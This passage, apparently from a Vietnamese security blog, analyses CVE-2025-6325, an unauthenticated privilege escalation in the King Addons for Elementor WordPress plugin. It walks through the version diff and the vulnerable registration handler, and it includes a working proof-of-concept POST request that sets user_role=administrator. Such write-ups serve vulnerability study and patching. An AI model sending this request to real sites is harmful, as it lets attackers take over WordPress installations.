1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;King Addons for Elementor&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;51.1.14&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;51.1.37&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Elementor Plugin&lt;/strong&gt; → &lt;a href=&#34;https://wordpress.org/plugins/elementor/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Elementor&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Thông tin&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;ul&gt;&#xA;&lt;li&gt;Như cái tên &lt;strong&gt;King Addons for Elementor&lt;/strong&gt;, plugin cần &lt;strong&gt;Elementor&lt;/strong&gt; để hoạt động. Plugin này cung cấp nhiều widget và tính năng mở rộng cho &lt;strong&gt;Elementor&lt;/strong&gt; nhằm hỗ trợ xây dựng giao diện website.&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-03-cve-2025-6325/widget.png&#34; title=&#34;Các widget của King Addons for Elementor&#34; data-thumbnail=&#34;/posts/2026-01-03-cve-2025-6325/widget.png&#34; data-sub-html=&#34;&lt;h2&gt;Widget&lt;/h2&gt;&lt;p&gt;Các widget của King Addons for Elementor&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-03-cve-2025-6325/widget.png&#39; alt=&#34;Widget&#34; height=&#34;994&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Các widget của King Addons for Elementor&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/li&gt;&#xA;&lt;li&gt;Lỗ hổng được ghi nhận ảnh hưởng từ &lt;strong&gt;không xác định (n/a)&lt;/strong&gt; đến &lt;strong&gt;phiên bản &lt;code&gt;51.1.36&lt;/code&gt; trở xuống&lt;/strong&gt;, tuy nhiên &lt;strong&gt;trên thực tế lỗ hổng này đã được vá ở một số phiên bản nằm trong phạm vi được công bố&lt;/strong&gt;, do đó không phải tất cả các phiên bản được liệt kê đều còn tồn tại vấn đề bảo mật này.&lt;/li&gt;&#xA;&lt;/ul&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Khi thực hiện diff code giữa phiên bản được công bố là ảnh hưởng gần nhất (&lt;code&gt;v51.1.36&lt;/code&gt;) và bản vá (&lt;code&gt;v51.1.37&lt;/code&gt;)&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-03-cve-2025-6325/diff1.png&#34; title=&#34;Diff code 1&#34; data-thumbnail=&#34;/posts/2026-01-03-cve-2025-6325/diff1.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff1&lt;/h2&gt;&lt;p&gt;Diff code 1&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-03-cve-2025-6325/diff1.png&#39; alt=&#34;Diff1&#34; height=&#34;465&#34; width=&#34;1837&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Diff code 1&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-03-cve-2025-6325/diff2.png&#34; title=&#34;Diff code 2&#34; data-thumbnail=&#34;/posts/2026-01-03-cve-2025-6325/diff2.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff2&lt;/h2&gt;&lt;p&gt;Diff code 2&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-03-cve-2025-6325/diff2.png&#39; alt=&#34;Diff2&#34; height=&#34;250&#34; width=&#34;1875&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Diff code 2&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Quan sát sự thay đổi của các file trên, tôi không thấy có sự thay đổi nào liên quan đến lỗ hổng &lt;strong&gt;Privilege Escalation&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;Thực hiện search sink với phiên bản &lt;code&gt;v51.1.36&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-03-cve-2025-6325/sink.png&#34; title=&#34;Search sink v51.1.36&#34; data-thumbnail=&#34;/posts/2026-01-03-cve-2025-6325/sink.png&#34; data-sub-html=&#34;&lt;h2&gt;Sink&lt;/h2&gt;&lt;p&gt;Search sink v51.1.36&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-03-cve-2025-6325/sink.png&#39; alt=&#34;Sink&#34; height=&#34;761&#34; width=&#34;1688&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Search sink v51.1.36&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Ta thấy, tại &lt;code&gt;file Login_Register_Form_Ajax.php&lt;/code&gt;, hàm &lt;code&gt;Login_Register_Form_Ajax::handle_register_ajax()&lt;/code&gt; cho phép nhận trực tiếp giá trị &lt;code&gt;$user_role&lt;/code&gt; từ request và gán vào mảng &lt;code&gt;$user_data&lt;/code&gt; trước khi gọi &lt;code&gt;wp_insert_user()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Đây chính là &lt;strong&gt;sink&lt;/strong&gt; của lỗ hổng, vì dữ liệu đầu vào không đáng tin cậy được truyền vào trực tiếp, gây ra &lt;strong&gt;Privilege Escalation&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Hàm &lt;code&gt;handle_register_ajax()&lt;/code&gt; được đăng ký làm callback cho action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action(&#xA;    &amp;#39;wp_ajax_nopriv_king_addons_user_register&amp;#39;,&#xA;    [&amp;#39;King_Addons\Widgets\Login_Register_Form\Login_Register_Form_Ajax&amp;#39;, &amp;#39;handle_register_ajax&amp;#39;]&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong đó:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_nopriv_&lt;/code&gt; là action hook dành cho &lt;strong&gt;tất cả người dùng&lt;/strong&gt;, kể cả những người chưa đăng nhập.&lt;/li&gt;&#xA;&lt;li&gt;Khi gửi request tới endpoint &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; với &lt;code&gt;action=king_addons_user_register&lt;/code&gt;, WordPress sẽ gọi &lt;code&gt;handle_register_ajax()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;&#39;King_Addons\Widgets\Login_Register_Form\Login_Register_Form_Ajax&#39;&lt;/code&gt; liên quan đến widget &lt;strong&gt;Login/Register Form&lt;/strong&gt; của plugin &lt;strong&gt;King Addons for Elementor&lt;/strong&gt;.&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-03-cve-2025-6325/form.png&#34; title=&#34;Login/Register Form của King Addons for Elementor&#34; data-thumbnail=&#34;/posts/2026-01-03-cve-2025-6325/form.png&#34; data-sub-html=&#34;&lt;h2&gt;Form&lt;/h2&gt;&lt;p&gt;Login/Register Form của King Addons for Elementor&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-03-cve-2025-6325/form.png&#39; alt=&#34;Form&#34; height=&#34;857&#34; width=&#34;1916&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Login/Register Form của King Addons for Elementor&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;=&amp;gt; Khi người dùng gửi form đăng ký này, dữ liệu nhập vào sẽ được &lt;strong&gt;truyền trực tiếp vào hàm &lt;code&gt;handle_register_ajax()&lt;/code&gt;&lt;/strong&gt; xử lý:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-03-cve-2025-6325/r_enable.png&#34; title=&#34;Tính năng user registration&#34; data-thumbnail=&#34;/posts/2026-01-03-cve-2025-6325/r_enable.png&#34; data-sub-html=&#34;&lt;h2&gt;Registration Enable&lt;/h2&gt;&lt;p&gt;Tính năng user registration&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-03-cve-2025-6325/r_enable.png&#39; alt=&#34;Registration Enable&#34; height=&#34;453&#34; width=&#34;1620&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Tính năng user registration&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Hàm chỉ tiếp tục xử lý nếu tính năng &lt;strong&gt;user registration&lt;/strong&gt; được bật, ta có thể bật nó trong Admin Dashboard:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-03-cve-2025-6325/membership.png&#34; title=&#34;Bật tính năng user registration&#34; data-thumbnail=&#34;/posts/2026-01-03-cve-2025-6325/membership.png&#34; data-sub-html=&#34;&lt;h2&gt;Member Ship&lt;/h2&gt;&lt;p&gt;Bật tính năng user registration&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-03-cve-2025-6325/membership.png&#39; alt=&#34;Member Ship&#34; height=&#34;878&#34; width=&#34;1074&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Bật tính năng user registration&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Khi tiếp tục phân tích phiên bản &lt;strong&gt;v51.1.36&lt;/strong&gt;, tôi nhận thấy một comment giải thích rằng đoạn code bên dưới là &lt;strong&gt;bản vá bảo mật&lt;/strong&gt;, nhằm chống &lt;strong&gt;Privilege Escalation&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-03-cve-2025-6325/analysis.png&#34; title=&#34;Phần comment&#34; data-thumbnail=&#34;/posts/2026-01-03-cve-2025-6325/analysis.png&#34; data-sub-html=&#34;&lt;h2&gt;Analysis&lt;/h2&gt;&lt;p&gt;Phần comment&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-03-cve-2025-6325/analysis.png&#39; alt=&#34;Analysis&#34; height=&#34;519&#34; width=&#34;1721&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Phần comment&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;So sánh với danh sách các lỗ hổng đã công bố của plugin &lt;strong&gt;King Addons for Elementor&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-03-cve-2025-6325/compare.png&#34; title=&#34;So sánh&#34; data-thumbnail=&#34;/posts/2026-01-03-cve-2025-6325/compare.png&#34; data-sub-html=&#34;&lt;h2&gt;Compare&lt;/h2&gt;&lt;p&gt;So sánh&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-03-cve-2025-6325/compare.png&#39; alt=&#34;Compare&#34; height=&#34;1021&#34; width=&#34;1537&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;So sánh&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Trong danh sách này chỉ có &lt;strong&gt;1 lỗ hổng Privilege Escalation&lt;/strong&gt; được ghi nhận.&lt;/li&gt;&#xA;&lt;li&gt;Tuy nhiên, ở phiên bản &lt;strong&gt;v51.1.36&lt;/strong&gt;, lỗ hổng này đã được vá.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;=&amp;gt; Điều này có nghĩa rằng &lt;strong&gt;phiên bản v51.1.36 không còn có thể bị khai thác lỗ hổng này&lt;/strong&gt;.&#xA;Đây chính là lý do tại phần &lt;a href=&#34;#requirements&#34;&gt;&lt;strong&gt;Requirements&lt;/strong&gt;&lt;/a&gt; tôi yêu cầu sử dụng phiên bản &lt;strong&gt;v51.1.14&lt;/strong&gt;, vì phiên bản này &lt;strong&gt;chưa chứa bản vá&lt;/strong&gt;, vẫn còn lỗ hổng để phục vụ phân tích hoặc thử nghiệm.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-03-cve-2025-6325/role.png&#34; title=&#34;Code v51.1.14&#34; data-thumbnail=&#34;/posts/2026-01-03-cve-2025-6325/role.png&#34; data-sub-html=&#34;&lt;h2&gt;Code v51.1.14&lt;/h2&gt;&lt;p&gt;Code v51.1.14&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-03-cve-2025-6325/role.png&#39; alt=&#34;Code v51.1.14&#34; height=&#34;521&#34; width=&#34;1771&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Code v51.1.14&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Unauthenticated User&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Submit Register Form (King Addons Login/Register Widget)&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;POST /wp-admin/admin-ajax.php&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;action=king_addons_user_register&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;wp_ajax_nopriv_king_addons_user_register&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;Login_Register_Form_Ajax::handle_register_ajax()&amp;#34;]&#xA;&#xA;F --&amp;gt; G{&amp;#34;User Registration Enabled?&amp;#34;}&#xA;G -- No --&amp;gt; H[&amp;#34;Abort&amp;#34;]&#xA;G -- Yes --&amp;gt; I[&amp;#34;Read POST parameters&amp;#34;]&#xA;&#xA;I --&amp;gt; J[&amp;#34;user_role taken directly from request&amp;#34;]&#xA;J --&amp;gt; K[&amp;#34;Build user_data array&amp;#34;]&#xA;&#xA;K --&amp;gt; L[&amp;#34;wp_insert_user(user_data)&amp;#34;]&#xA;L --&amp;gt; M[&amp;#34;WordPress assigns role from user_role&amp;#34;]&#xA;&#xA;M --&amp;gt; N[&amp;#34;User account created with elevated role&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Submit form register và cho request đi qua Burp Proxy&lt;/li&gt;&#xA;&lt;li&gt;Thêm &lt;code&gt;user_role&lt;/code&gt; param với giá trị &lt;code&gt;administrator&lt;/code&gt; vào request và gửi:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;&#xA;action=king_addons_user_register&amp;amp;nonce=2d3fdafcc0&amp;amp;email=abc%40gmail.com&amp;amp;username=abc&amp;amp;password=Hacker111%3F&amp;amp;confirm_password=Hacker111%3F&amp;amp;widget_id=c03756f&amp;amp;recaptcha_secret_key=&amp;amp;recaptcha_score_threshold=0.5&amp;amp;redirect_after_register=&amp;amp;terms_required=no&amp;amp;enable_user_email=yes&amp;amp;user_email_subject=Welcome&amp;#43;to&amp;#43;%7Bsite_name%7D!&amp;amp;user_email_content=Hello&amp;#43;%7Buser_name%7D%2C%0A%0AWelcome&amp;#43;to&amp;#43;%7Bsite_name%7D!%0A%0AYour&amp;#43;account&amp;#43;has&amp;#43;been&amp;#43;successfully&amp;#43;created.%0A%0AUsername%3A&amp;#43;%7Busername%7D%0AEmail%3A&amp;#43;%7Buser_email%7D%0A%0AThank&amp;#43;you&amp;#43;for&amp;#43;joining&amp;#43;us!%0A%0ABest&amp;#43;regards%2C%0A%7Bsite_name%7D&amp;#43;Team&amp;amp;enable_admin_email=no&amp;amp;admin_email_address=&amp;amp;admin_email_subject=&amp;amp;admin_email_content=&amp;amp;enable_mailchimp_integration=no&amp;amp;mailchimp_api_key=&amp;amp;mailchimp_list_id=&amp;amp;mailchimp_double_optin=no&amp;amp;auto_login_after_register=yes&amp;amp;user_role=administrator&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-03-cve-2025-6325/result.png&#34; title=&#34;Kết quả&#34; data-thumbnail=&#34;/posts/2026-01-03-cve-2025-6325/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Kết quả&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-03-cve-2025-6325/result.png&#39; alt=&#34;Result&#34; height=&#34;662&#34; width=&#34;1544&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Kết quả&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Login bằng tài khoản đã tạo&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-03-cve-2025-6325/login.png&#34; title=&#34;Login&#34; data-thumbnail=&#34;/posts/2026-01-03-cve-2025-6325/login.png&#34; data-sub-html=&#34;&lt;h2&gt;Login&lt;/h2&gt;&lt;p&gt;Login&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-03-cve-2025-6325/login.png&#39; alt=&#34;Login&#34; height=&#34;740&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Login&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng &lt;strong&gt;CVE-2025-6325&lt;/strong&gt; trong plugin &lt;strong&gt;King Addons for Elementor&lt;/strong&gt; cho phép &lt;strong&gt;Privilege Escalation&lt;/strong&gt; thông qua form đăng ký người dùng. Nguyên nhân chính là giá trị &lt;code&gt;user_role&lt;/code&gt; được lấy trực tiếp từ request mà không kiểm tra trước khi gán cho tài khoản mới. Phiên bản &lt;strong&gt;v51.1.14&lt;/strong&gt; vẫn chứa lỗ hổng này, trong khi &lt;strong&gt;v51.1.36&lt;/strong&gt; đã được vá, do đó không thể khai thác nữa. Việc phân tích diff giữa các phiên bản cho thấy bản vá giới hạn role được phép và tránh tình trạng người dùng gán role nguy hiểm như &lt;code&gt;administrator&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Lỗ hổng xuất phát từ &lt;strong&gt;thiếu kiểm soát input (untrusted input)&lt;/strong&gt; trong hàm xử lý đăng ký AJAX.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_nopriv_&lt;/code&gt; cho phép &lt;strong&gt;người dùng chưa đăng nhập&lt;/strong&gt; gửi request tới endpoint và khai thác lỗ hổng.&lt;/li&gt;&#xA;&lt;li&gt;Bản vá giới hạn 